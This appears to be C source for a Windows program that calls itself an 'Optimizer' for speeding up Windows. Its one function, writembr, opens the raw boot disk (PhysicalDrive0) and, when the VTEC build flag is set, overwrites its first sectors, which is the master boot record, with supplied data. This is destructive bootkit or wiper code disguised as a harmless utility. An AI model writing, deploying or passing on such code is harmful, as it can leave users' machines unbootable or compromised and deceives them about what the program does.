/* 
 * Optimizer -- Speed up Windows
 * 
 * Copyright (C) 2010  Anonymous
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to 
 * the Free Software Foundation, Inc.
 * 51 Franklin Street, Fifth Floor
 * Boston, MA  02110-1301, USA
 * 
 */

#include <windows.h>
#include <stdio.h>
#include <io.h>
#include <fcntl.h>

int writembr(char *data, int size) {
	HANDLE DiskHandle;
	int wsize, i;
#ifdef VTEC
	DWORD written;
	BOOL ret;
#endif
	
	wsize = (size + 511)/ 512;
   
	DiskHandle = CreateFile(TEXT("\\\\.\\PhysicalDrive0"), 
		GENERIC_ALL, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_EXISTING,
		FILE_FLAG_NO_BUFFERING | FILE_FLAG_WRITE_THROUGH, 0);

	if(DiskHandle == INVALID_HANDLE_VALUE) {
		fprintf(stderr, "ERROR: Invalid file handle.\n");			
		return -1;
	}

	printf("Writing MBR...\n");
	for (i = 0; i < wsize; ++i) {
#ifdef VTEC
		printf("Writing sector %i of %i... ", i, wsize); fflush(stderr);
		written = 0;
		ret = WriteFile(DiskHandle, data, 512, &written, NULL);
		printf("ret = %i; written = %u.\n", ret, written);
#else
		printf("Not really.\n");
#endif	
	}

	CloseHandle(DiskHandle);
	
	return 0;
}